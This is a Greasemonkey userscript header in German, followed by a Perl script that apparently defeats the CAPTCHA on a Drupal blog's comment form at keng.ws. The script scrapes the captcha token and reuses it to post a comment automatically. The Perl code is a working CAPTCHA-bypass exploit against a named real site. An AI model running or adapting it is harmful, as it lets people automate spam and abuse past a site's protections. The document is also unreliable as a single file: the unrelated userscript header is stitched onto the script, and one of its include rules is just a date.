// ==UserScript==
// @name           Seite bearbeiten
// @namespace      Alle Seiten
// @description    Man kann jede Seite bearbeiten, aber es wird nicht gespeichert.
// @include     http://websecurity.com.ua
// @include     28.10.2007
// @include     http://tutudragon3.info*
// @include     *locker.com/*
// @include     *ptzplace.lockerz.com*
// ==/UserScript==
#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Cookies;

my $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414";
my $page_url = "http://www.keng.ws/2007/09/329";
my $url = "http://www.keng.ws/comment/reply/329";

my $ua = LWP::UserAgent->new;
$ua->agent($agent);
$ua->cookie_jar(HTTP::Cookies->new(file => "reCaptcha_cookies.txt",autosave => 1));

print "Content-type:text/html\n\n";
my $captcha_token = &GetToken;
&BypassCaptcha if ($captcha_token);
exit;

sub GetToken() {
	my $res = $ua->get($page_url);

	if ($res->is_success) {
		$res->content =~ /id="edit-captcha-token" value="(.+?)"/;
		return $1;
	}
	else {
		print "Error: " . $res->status_line;
		return 0;
	}
}

sub BypassCaptcha() {
	my %fields = (
	'name' => 'Test',
	'mail' => 'test@test.test',
	'homepage' => 'http://websecurity.com.ua',
	'comment' => 'Captcha bypass test.',
	'form_id' => 'comment_form',
	'captcha_token' => $captcha_token,
	'op' => 'Post comment'
	);
	my $res = $ua->post($url,[%fields]);

	if ($res->status_line =~ "^302") {
		$res = $ua->get($page_url);
		if ($res->is_success) {
			print $res->content;
		}
		else {
			print "Error: " . $res->status_line;
		}
	}
	else {
		print "Error: " . $res->status_line;
	}
}